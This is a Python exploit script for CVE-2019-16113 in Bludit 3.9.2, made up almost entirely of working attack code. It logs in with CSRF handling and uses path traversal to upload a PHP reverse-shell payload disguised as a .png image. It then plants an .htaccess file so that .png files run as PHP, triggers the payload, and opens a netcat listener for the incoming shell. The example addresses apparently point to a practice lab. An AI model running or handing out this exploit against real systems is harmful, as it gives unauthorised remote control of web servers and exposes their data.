#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
# ▀█████████▄   ▄█       ███    █▄  ████████▄   ▄█      ███                                                    #
# ███    ███ ███       ███    ███ ███   ▀███ ███  ▀█████████▄                                                  #
# ███    ███ ███       ███    ███ ███    ███ ███▌    ▀███▀▀██                                                  #
# ▄███▄▄▄██▀  ███       ███    ███ ███    ███ ███▌     ███   ▀                                                 #
# ▀▀███▀▀▀██▄  ███       ███    ███ ███    ███ ███▌     ███                                                    #
# ███    ██▄ ███       ███    ███ ███    ███ ███      ███                                                      #
# ███    ███ ███▌    ▄ ███    ███ ███   ▄███ ███      ███                                                      #
# ▄█████████▀  █████▄▄██ ████████▀  ████████▀  █▀      ▄████▀                                                  #
# ▀                                                                                                            #
# DATE                                                                                                         #
# 12/06/2020                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2019-16113 - Bludit Directory Traversal Image File Upload Remote command execution                       #
#                                                                                                              #
# Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be       #
# entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname             #
#                                                                                                              #
# nighter - http://nighter.se/                                                                                 #
#                                                                                                              #
################################################################################################################

import requests
import time
import re
import sys
import signal
import os

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


class Exploit:

    def __init__(self, address, lhost, lport, username, password):

        self.address = address
        self.lhost = lhost
        self.lport = lport
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.csrf_token = ''
        self.uuid = ''
        self.login()
        self.upload_execute()

    def get_csrf_token_uuid(self):

        token_url = '%s/admin/new-content/index.php' % self.address

        try:
            r = self.session.get(token_url)
        except requests.exceptions.RequestException as e:
            print('[-] get csrf_token failed: ', e)
            sys.exit(98)

        csrf_token = re.search('"tokenCSRF".+?value="(.+?)"', r.text).group(1)
        self.csrf_token = csrf_token

        uuid = re.search('(?<=name="uuid" value=")[a-z0-9]+(?=">)', r.text).group(0)
        self.uuid = uuid
        return True


    def login(self):

        login_url = '%s/admin/login' % self.address

        r = self.session.get(login_url)
        self.csrf_token = re.search('"tokenCSRF".+?value="(.+?)"', r.text).group(1)

        data = {
            'tokenCSRF': self.csrf_token,
            'username': self.username,
            'password': self.password,
            'save': ''
        }

        r = self.session.post(login_url, data=data, allow_redirects=False)
        if '/admin/dashboard' in r.headers['location']:
            print('[+] Login successful')
            return r
        else:
            print('[-] Login failed')
            sys.exit(99)

    def upload_execute(self):

        self.get_csrf_token_uuid()
        upload_url = '%s/admin/ajax/upload-images' % self.address

        PAYLOAD = '''<?php set_time_limit (0); $VERSION = "1.0"; $ip = '10.10.14.4'; $port = '4444'; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \'uname -a; w; id; /bin/sh -i\'; $daemon = 0; $debug = 0; if (function_exists(\'pcntl_fork\')) {$pid = pcntl_fork(); if ($pid == -1) {printit("ERROR: Can\'t fork"); exit(1);} if ($pid) {exit(0);} if (posix_setsid() == -1) {printit("Error: Can\'t setsid()"); exit(1);} $daemon = 1;} else {printit("WARNING: Failed to daemonise. This is quite common and not fatal.");} chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) {printit("$errstr ($errno)"); exit(1);} $descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) {printit("ERROR: Can\'t spawn shell"); exit(1);} stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) {if (feof($sock)) {printit("ERROR: Shell connection terminated"); break;} if (feof($pipes[1])) {printit("ERROR: Shell process terminated"); break;} $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) {if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input);} if (in_array($pipes[1], $read_a)) {if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input);} if (in_array($pipes[2], $read_a)) {if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input);}} fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {if (!$daemon) {print "$string\n";}} ?>'''
        files = {'images[]': ('payload.png', PAYLOAD), 'uuid': (None, '../../tmp'), 'tokenCSRF': (None, self.csrf_token)}

        try:
            r = self.session.post(upload_url, files=files)
        except requests.exceptions.RequestException as e:
            print('[-] Upload failed: ', e)
            sys.exit(1)

        if r.status_code == 200:
            print('[+] Upload payload.png successful!')
        else:
            print('[-] Error upload payload.png file. Response code: %s' % r.status_code)
            sys.exit(1)

        # Disable RewriteEngine and change MIME type for .png files to application/x-httpd-php
        files = {'images[]': ('.htaccess', 'RewriteEngine off\nAddType application/x-httpd-php .png'), 'uuid': (None, self.uuid), 'tokenCSRF': (None, self.csrf_token)}
        try:
            r = self.session.post(upload_url, files=files)
        except requests.exceptions.RequestException as e:
            print('[-] Upload .htaccess failed: ', e)
            sys.exit(93)

        if r.status_code == 200:
             print('[+] Upload .htaccess successful')
        else:
            print('[-] Failed upload .htaccess: %s ' % r.status_code)
            sys.exit(94)

        # Execute payload
        payload_url = '%s/bl-content/tmp/payload.png' % self.address

        print('[+] Execute payload')
        try:
            r = requests.get(payload_url)
        except requests.exceptions.RequestException as e:
            print('[-] Failed execute payload: ', e)
            sys.exit(1)


def init_exploit():

    time.sleep(3)
    Exploit(URL, LHOST, LPORT, USERNAME, PASSWORD)


if __name__ == '__main__':

    if len(sys.argv) < 5:
        print ("""
▀█████████▄   ▄█       ███    █▄  ████████▄   ▄█      ███     
  ███    ███ ███       ███    ███ ███   ▀███ ███  ▀█████████▄ 
  ███    ███ ███       ███    ███ ███    ███ ███▌    ▀███▀▀██ 
 ▄███▄▄▄██▀  ███       ███    ███ ███    ███ ███▌     ███   ▀ 
▀▀███▀▀▀██▄  ███       ███    ███ ███    ███ ███▌     ███     
  ███    ██▄ ███       ███    ███ ███    ███ ███      ███     
  ███    ███ ███▌    ▄ ███    ███ ███   ▄███ ███      ███     
▄█████████▀  █████▄▄██ ████████▀  ████████▀  █▀      ▄████▀   
             ▀                                                
CVE-2019-16113 - [nighter@nighter.se]                                                              
        """)
        print("Usage: %s <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("EXAMPLE: ./bludit_cms_rce.py 'http://10.10.10.XX' 10.10.14.24 4444 <USERNAME> <PASSWORD>\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    p = Process(target=init_exploit)
    p.start()

    print("[+] Netcat: %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)


